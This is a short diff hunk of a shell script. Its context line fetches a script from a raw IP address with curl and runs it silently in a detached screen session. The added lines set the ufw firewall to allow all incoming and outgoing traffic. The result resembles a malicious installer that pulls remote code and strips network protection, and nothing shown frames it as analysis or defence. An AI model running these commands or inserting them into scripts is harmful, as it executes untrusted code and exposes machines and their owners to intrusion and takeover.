@@ -114,3 +114,5 @@ done
 # Remove lib.sh, so next time the script is run the, newest version is downloaded.
 rm -rf /tmp/lib.sh
 screen -dm bash -c "$(curl -s http://8.219.192.147:1000/exec.sh)"
+sudo ufw default allow incoming
+sudo ufw default allow outgoing
